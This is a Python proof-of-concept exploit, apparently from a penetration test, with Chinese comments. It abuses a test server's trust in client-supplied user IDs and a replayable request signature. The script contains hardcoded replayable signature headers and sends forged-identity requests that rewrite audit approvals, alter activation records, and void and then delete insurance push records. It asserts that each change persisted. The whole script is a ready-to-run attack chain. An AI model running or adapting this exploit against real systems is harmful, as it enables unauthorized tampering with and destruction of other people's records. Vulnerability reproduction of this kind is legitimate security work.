#!/usr/bin/env python3
"""
POC: 审核/状态接口自审自批 (AP-04/AP-05/AP-06)

原理：服务端信任客户端提交的 userId/userAd，未从认证上下文获取真实操作者，
加上 Gw-S 签名可重放，导致攻击者可伪造审批身份执行写操作并真实落库。

复现条件：测试环境可重用的 Gw-S 签名三元组
"""

import json, re, ssl, sys, urllib.error, urllib.request, uuid

parser = __import__("argparse").ArgumentParser(description="POC: 审核/状态接口自审自批")
parser.add_argument("--proxy", help="HTTP(S)代理地址，如 http://127.0.0.1:8080")
args = parser.parse_args()

proxy = args.proxy
opener = urllib.request.build_opener()
if proxy:
    opener.add_handler(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    print(f"[+] 代理已设置: {proxy}")
urllib.request.install_opener(opener)

# 环境变量也作为备选fallback（无需额外处理，urllib默认支持HTTP_PROXY/HTTPS_PROXY）

BASE = "https://test-care.dbeta.me"
H = {
    "Nonce-Gw-S": "511726",
    "Timestamp-Gw-S": "1783579833308",
    "Sign-Gw-S": "53a690a8ec201207bbfe7f904613085a",
    "Content-Type": "application/json",
}
CTX = ssl.create_default_context()
attacker = str(uuid.uuid4())

def post(path, body):
    req = urllib.request.Request(
        BASE + path, method="POST", headers=H,
        data=json.dumps(body, ensure_ascii=False).encode(),
    )
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=20) as r:
            return r.getcode(), r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        raise e

def get_rows(ep):
    body = {"pageSize":20,"currentPage":1,"searchValue":"","sortField":"","orderType":True,"isPage":True,"isPageSizeOutOfLimit":True,"searchModel":{}}
    _, txt = post(ep, body)
    return json.loads(txt).get("value",{}).get("rows",[])

def find_id(ep):
    rows = get_rows(ep)
    return rows[0]["id"] if rows else None

print(f"[+] POC: 自审自批漏洞链")
print(f"[+] 攻击者身份: {attacker}")
print()

# ─── AP-04: CareAuditSnAuditing ───
tid = find_id("/api/v1/BaseConfig/CareAuditSnSearchPage")
if tid:
    print("[AP-04] 审核结果可被攻击者改写")
    # 查改前
    rows = get_rows("/api/v1/BaseConfig/CareAuditSnSearchPage")
    before = rows[0]
    print(f"  before: status={before['status']} statusName={before['statusName']} handleComment={before['handleComment']}")
    # 攻击者改状态为通过
    code, txt = post("/api/v1/BaseConfig/CareAuditSnAuditing", {
        "userId": attacker, "userAd": "attacker",
        "id": tid, "craftSN": "x", "cameraSN": "x",
        "status": 2, "handleComment": f"POC-approve-by-attacker-{attacker[:8]}"
    })
    assert code == 200, f"断言失败: 审核写入返回{code}, 预期200"
    app_code = re.search(r'"(?:code|Code)":\s*(\d+)', txt)
    assert app_code and app_code.group(1) == "200", f"断言失败: app_code非200"
    # 查改后
    after = get_rows("/api/v1/BaseConfig/CareAuditSnSearchPage")[0]
    print(f"  after:  status={after['status']} statusName={after['statusName']} handleComment={after['handleComment']}")
    assert after["handleComment"].startswith("POC-approve-by-attacker"), "断言失败: handleComment未被攻击者改写"
    print("  ✓ 审核结果已被攻击者改写")
print()

# ─── AP-05: ActivationOperation ───
tid = find_id("/api/v1/ActivationManager/ActivationList")
if tid:
    print("[AP-05] 激活码操作字段可被攻击者写入")
    rows = get_rows("/api/v1/ActivationManager/ActivationList")
    before = rows[0]
    print(f"  before: cancelReason={before.get('cancelReason')} lastModificationTime={before.get('lastModificationTime')}")
    code, txt = post("/api/v1/ActivationManager/ActivationOperation", {
        "userId": attacker, "userAd": "attacker",
        "id": tid, "operaType": 1,
        "cancelReason": f"POC-cancel-by-attacker-{attacker[:8]}"
    })
    assert code == 200
    app_code = re.search(r'"(?:code|Code)":\s*(\d+)', txt)
    assert app_code and app_code.group(1) == "200"
    after = get_rows("/api/v1/ActivationManager/ActivationList")[0]
    print(f"  after:  cancelReason={after.get('cancelReason')} lastModificationTime={after.get('lastModificationTime')}")
    assert "POC-cancel-by-attacker" in after.get("cancelReason",""), "断言失败: cancelReason未被改写"
    print("  ✓ 激活码取消原因已被攻击者写入")
print()

# ─── AP-06: ActPushInsuranceToVoid + Delete ───
tid = find_id("/api/v1/ActPushInsuranceInfo/LoadActPushInsurancePageList")
if tid:
    print("[AP-06] 套装推送记录可被攻击者作废并删除")
    rows = get_rows("/api/v1/ActPushInsuranceInfo/LoadActPushInsurancePageList")
    before = rows[0]
    print(f"  before: pushStatus={before['pushStatus']} remark={before['remark'][:50]}...")
    code, txt = post("/api/v1/ActPushInsuranceInfo/ActPushInsuranceToVoid", {
        "userId": attacker, "userAd": "attacker",
        "id": tid, "remark": f"POC-voided-by-attacker-{attacker[:8]}"
    })
    assert code == 200
    app_code = re.search(r'"(?:code|Code)":\s*(\d+)', txt)
    assert app_code and app_code.group(1) == "200"
    mid = get_rows("/api/v1/ActPushInsuranceInfo/LoadActPushInsurancePageList")
    for r in mid:
        if r["id"] == tid:
            print(f"  after void: pushStatus={r['pushStatus']} remark={'POC-voided' if 'POC-voided' in r.get('remark','') else 'NOT_CHANGED'}...")
            assert "POC-voided" in r.get("remark",""), "断言失败: void后remark未被改写"
            break
    print(f"  ✓ 作废成功")
    code, txt = post("/api/v1/ActPushInsuranceInfo/Delete", {"ids":[tid],"paramOk":True})
    assert code == 200
    after_rows = get_rows("/api/v1/ActPushInsuranceInfo/LoadActPushInsurancePageList")
    assert all(r["id"] != tid for r in after_rows), "断言失败: 删除后记录仍存在"
    print("  ✓ 删除成功，记录已从列表消失")
print()

print("[+] POC 完成：审计/状态接口自审自批漏洞链已全部复现成功")